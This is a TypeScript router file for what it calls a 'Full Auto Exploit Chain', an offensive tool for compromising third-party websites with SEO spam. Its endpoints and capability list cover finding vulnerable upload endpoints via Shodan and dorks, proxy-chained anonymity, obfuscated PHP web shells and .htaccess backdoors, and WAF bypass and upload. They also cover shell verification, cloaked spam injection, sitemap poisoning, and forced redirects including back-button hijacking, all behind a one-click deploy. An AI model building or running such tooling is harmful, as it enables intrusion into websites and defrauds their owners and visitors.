/**
 * SEO SPAM Router — Full Auto Exploit Chain
 * Ported from seo_engine.py
 * Includes: payload generation + real execution flow
 */
import { z } from "zod";
import { superadminProcedure, router } from "../_core/trpc";
import { getUserMethodPriority, saveUserMethodPriority } from "../db";
import {
  runFullSpamChain,
  runSingleSpamPhase,
  runSingleSpamCapability,
  type FullSpamReport,
  type SpamPhaseResult,
} from "../seo-spam-engine";
import {
  shodanSearch,
  googleDorkSearch,
  testProxy,
  testAllProxies,
  generateObfuscatedShell,
  multiLayerObfuscate,
  verifyShell,
  executeFullAttack,
  generateJsonReport,
  generateTxtReport,
  type ExecutionReport,
} from "../seo-spam-executor";
import {
  oneClickDeploy,
  type DeployResult,
} from "../one-click-deploy";

const CAPABILITIES = [
  // Phase 1: Target Discovery
  "shodan_search", "google_dork", "path_enumeration",
  // Phase 2: Proxy Rotation
  "proxy_rotation", "proxy_chain", "ua_rotation",
  // Phase 3: Shell Obfuscation
  "php_shell_basic", "php_shell_polymorphic", "htaccess_backdoor", "filename_bypass",
  // Phase 4: WAF Bypass
  "waf_header_bypass", "content_type_confusion", "chunked_bypass", "path_traversal",
  // Phase 5: SEO Spam Injection
  "meta_tag_spam", "hidden_links", "doorway_content", "cloaked_canonical", "sitemap_poison",
  // Phase 6: Auto Redirect
  "js_redirect_basic", "js_redirect_obfuscated", "php_redirect", "htaccess_redirect", "service_worker_redirect", "back_button_hijack",
] as const;

export const seoSpamRouter = router({
  // ═══════════════════════════════════════════════════════
  //  PAYLOAD GENERATION (existing)
  // ═══════════════════════════════════════════════════════

  // Run full 6-phase attack chain (payload generation)
  runFullChain: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().optional(),
    }))
    .mutation(async ({ input }): Promise<FullSpamReport> => {
      return await runFullSpamChain(input.targetDomain, input.redirectUrl);
    }),

  // Run a single phase (1-6)
  runPhase: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      phase: z.number().min(1).max(6),
      redirectUrl: z.string().optional(),
    }))
    .mutation(async ({ input }): Promise<SpamPhaseResult> => {
      return runSingleSpamPhase(input.targetDomain, input.phase, input.redirectUrl);
    }),

  // Run a single capability
  runCapability: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      capability: z.enum(CAPABILITIES),
      redirectUrl: z.string().optional(),
    }))
    .mutation(({ input }) => {
      const result = runSingleSpamCapability(input.targetDomain, input.capability, input.redirectUrl);
      return { capability: input.capability, results: result };
    }),

  // ═══════════════════════════════════════════════════════
  //  REAL EXECUTION (new)
  // ═══════════════════════════════════════════════════════

  // Execute full real attack flow (Shodan → Proxy → Upload → Verify → Inject)
  executeAttack: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().min(1),
    }))
    .mutation(async ({ input }): Promise<ExecutionReport> => {
      return await executeFullAttack(input.targetDomain, input.redirectUrl);
    }),

  // Real Shodan API search
  shodanSearch: superadminProcedure
    .input(z.object({
      targetDomain: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const results = await shodanSearch(input.targetDomain);
      const dorkTargets = await googleDorkSearch(input.targetDomain);
      return {
        shodanResults: results,
        dorkTargets,
        totalMatches: results.reduce((sum, r) => sum + r.matches.length, 0),
        totalDorkTargets: dorkTargets.length,
      };
    }),

  // Test a single proxy
  testSingleProxy: superadminProcedure
    .input(z.object({
      proxyUrl: z.string().min(1),
    }))
    .mutation(async ({ input }) => {
      return await testProxy(input.proxyUrl);
    }),

  // Test all proxies
  testAllProxies: superadminProcedure
    .mutation(async () => {
      const results = await testAllProxies();
      return {
        results,
        working: results.filter(p => p.working).length,
        total: results.length,
      };
    }),

  // Generate obfuscated shell (4-layer)
  generateShell: superadminProcedure
    .input(z.object({
      count: z.number().min(1).max(10).default(1),
    }))
    .mutation(({ input }) => {
      const shells = [];
      for (let i = 0; i < input.count; i++) {
        shells.push(generateObfuscatedShell());
      }
      return { shells, count: shells.length };
    }),

  // Obfuscate custom code
  obfuscateCode: superadminProcedure
    .input(z.object({
      code: z.string().min(1),
      layers: z.number().min(1).max(8).default(4),
    }))
    .mutation(({ input }) => {
      const result = multiLayerObfuscate(input.code, input.layers);
      return {
        original: input.code,
        obfuscated: result.obfuscated,
        layers: result.appliedLayers,
        layerCount: result.appliedLayers.length,
      };
    }),

  // Verify an uploaded shell
  verifyShell: superadminProcedure
    .input(z.object({
      shellUrl: z.string().min(1),
      password: z.string().min(1),
    }))
    .mutation(async ({ input }) => {
      return await verifyShell(input.shellUrl, input.password);
    }),

  // ═══════════════════════════════════════════════════════
  //  ONE-CLICK DEPLOY (กดปุ่มเดียว วางไฟล์ + redirect)
  // ═══════════════════════════════════════════════════════

  // One-click deploy: scan → shell → upload → verify → deploy files → redirect
  oneClickDeploy: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().min(1),
      maxRetries: z.number().min(0).max(10).default(5),
      geoRedirectEnabled: z.boolean().default(true),
      landingHtml: z.string().optional(),
    }))
    .mutation(async ({ input }): Promise<DeployResult> => {
      return await oneClickDeploy(input.targetDomain, input.redirectUrl, {
        maxRetries: input.maxRetries,
        geoRedirectEnabled: input.geoRedirectEnabled,
        landingHtml: input.landingHtml,
      });
    }),

  // List all capabilities
  capabilities: superadminProcedure
    .query(() => {
      return {
        phases: [
          {
            phase: 1,
            name: "Target Discovery",
            icon: "🔍",
            riskLevel: 4,
            description: "Shodan API + Google Dork vulnerability scanning",
            capabilities: [
              { id: "shodan_search", name: "Shodan Search", description: "Search for vulnerable upload endpoints via Shodan API" },
              { id: "google_dork", name: "Google Dork", description: "Find exposed upload scripts using Google Dorks" },
              { id: "path_enumeration", name: "Path Enumeration", description: "Brute-force enumerate upload paths on target" },
            ],
          },
          {
            phase: 2,
            name: "Proxy Rotation",
            icon: "🔄",
            riskLevel: 3,
            description: "Rotating proxy pool, multi-hop chains, UA rotation",
            capabilities: [
              { id: "proxy_rotation", name: "Proxy Rotation", description: "Test and rotate through proxy pool" },
              { id: "proxy_chain", name: "Proxy Chain", description: "Multi-hop proxy chaining for deep anonymization" },
              { id: "ua_rotation", name: "UA Rotation", description: "User-Agent and header rotation" },
            ],
          },
          {
            phase: 3,
            name: "Shell Generation",
            icon: "💀",
            riskLevel: 9,
            description: "Obfuscated PHP shells, polymorphic variants, .htaccess backdoors",
            capabilities: [
              { id: "php_shell_basic", name: "PHP Shell (Basic)", description: "Base64 obfuscated eval shell" },
              { id: "php_shell_polymorphic", name: "PHP Shell (Polymorphic)", description: "str_rot13 + md5 cookie-gated shell" },
              { id: "htaccess_backdoor", name: ".htaccess Backdoor", description: "Execute PHP in image files via rewrite rules" },
              { id: "filename_bypass", name: "Filename Bypass", description: "Extension filter bypass variants" },
            ],
          },
          {
            phase: 4,
            name: "WAF Bypass + Upload",
            icon: "🛡️",
            riskLevel: 9,
            description: "Header manipulation, Content-Type confusion, chunked encoding",
            capabilities: [
              { id: "waf_header_bypass", name: "Header Bypass", description: "Googlebot UA, X-Forwarded-For, chunked encoding" },
              { id: "content_type_confusion", name: "Content-Type Confusion", description: "GIF89a/PNG header + EXIF injection" },
              { id: "chunked_bypass", name: "Chunked Encoding", description: "Split payload into chunks to evade WAF" },
              { id: "path_traversal", name: "Path Traversal", description: "Directory escape in upload filename" },
            ],
          },
          {
            phase: 5,
            name: "SEO Spam Injection",
            icon: "📧",
            riskLevel: 8,
            description: "Meta tags, hidden links, doorway content, cloaked canonical",
            capabilities: [
              { id: "meta_tag_spam", name: "Meta Tag Spam", description: "Hijack title, description, OG, canonical, robots" },
              { id: "hidden_links", name: "Hidden Links", description: "CSS hidden, off-screen, zero-opacity backlinks" },
              { id: "doorway_content", name: "Doorway Content", description: "Hidden pages with JSON-LD structured data" },
              { id: "cloaked_canonical", name: "Cloaked Canonical", description: "UA-based cloaking — bots see spam, humans see original" },
              { id: "sitemap_poison", name: "Sitemap Poison", description: "Inject spam URLs into sitemap.xml" },
            ],
          },
          {
            phase: 6,
            name: "Auto Redirect",
            icon: "🔀",
            riskLevel: 9,
            description: "JS redirect, PHP 302, .htaccess, Service Worker, back hijack",
            capabilities: [
              { id: "js_redirect_basic", name: "JS Redirect", description: "Delayed redirect with bot exclusion" },
              { id: "js_redirect_obfuscated", name: "Obfuscated Redirect", description: "Base64 + dynamic meta refresh" },
              { id: "php_redirect", name: "PHP 302 Redirect", description: "Server-side redirect with cookie tracking" },
              { id: "htaccess_redirect", name: ".htaccess Redirect", description: "Mobile, referrer, time-based rules" },
              { id: "service_worker_redirect", name: "Service Worker", description: "Persistent SW redirect — survives reload" },
              { id: "back_button_hijack", name: "Back Button Hijack", description: "History API abuse + beforeunload" },
            ],
          },
        ],
      };
    }),

  // ═══════════════════════════════════════════════════════
  //  METHOD PRIORITY — Save/Load per user
  // ═══════════════════════════════════════════════════════

  getMethodPriority: superadminProcedure
    .query(async ({ ctx }) => {
      const result = await getUserMethodPriority(ctx.user.id);
      return result; // null means no saved config — frontend uses defaults
    }),

  saveMethodPriority: superadminProcedure
    .input(z.object({
      enabledMethods: z.array(z.string()),
      fullConfig: z.array(z.object({
        id: z.string(),
        enabled: z.boolean(),
      })),
    }))
    .mutation(async ({ ctx, input }) => {
      await saveUserMethodPriority(ctx.user.id, input.enabledMethods, input.fullConfig);
      return { success: true };
    }),
});
